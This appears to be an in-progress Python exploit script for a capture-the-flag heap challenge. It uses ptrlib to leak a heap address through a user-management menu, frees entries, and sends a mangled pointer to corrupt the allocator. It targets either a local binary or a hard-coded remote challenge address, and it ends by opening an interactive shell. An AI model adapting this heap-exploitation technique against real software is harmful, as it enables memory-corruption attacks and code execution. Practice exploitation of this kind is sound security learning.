#!/usr/bin/env python
import ptrlib as ptr
import sys

exe = ptr.ELF("./run_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        addr = "94.237.60.228:46774"
        addr = addr.split(":")
        host = addr[0]
        port = int(addr[1])
        return ptr.Socket(host, port)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def new(username: bytes | str, password: bytes| str):
        io.sendlineafter("> ", "2")
        io.sendlineafter("username > ", username)
        io.sendlineafter("password > ", password)
        return

    def delete(username: bytes | str):
        io.sendlineafter("> ", "3")
        if len(username) == 8:
            io.sendafter("username > ", username)
        else :
            io.sendlineafter("username > ", username)
        return

    def change(username: bytes | str, password: bytes | str):
        io.sendlineafter("> ", "4")
        io.sendlineafter("username > ", username)
        io.sendlineafter("password > ", password)
        return

    def view() -> bytes:
        io.sendlineafter("> ", "5")
        return io.recvuntil("---- menu ----").strip(b"---- menu ----")

    new("A", "BBBBBBBB")
    heap_base = ptr.u64(view().split(b"A: BBBBBBBB")[1].split(b"\nroot")[0])
    heap_base = heap_base >> 12 << 12
    print(f'heap_base = {hex(heap_base)}')

    new("B", "C")
    new("C", "D")

    delete("A")
    delete("B")
    delete("C")
    input(">>")
    delete(ptr.p64(heap_base >> 12))

    # print(hex(heap_base >> 12))



    # new("B", "CCCCCCCC")
    # delete("A")
    # print("hello")
    # print(view())
    # delete("A")
    # delete(ptr.p64(heap_base >> 12))


    # malloc_num = 7 + 10
    # for i in range(malloc_num):
    #     new(chr(0x42 + i), "pass")
    #     continue
    # for i in range(malloc_num):
    #     delete(chr(0x42 + malloc_num - 1 - i))
    #     continue

    # input(">>")
    io.sh()
    return


if __name__ == "__main__":
    main()
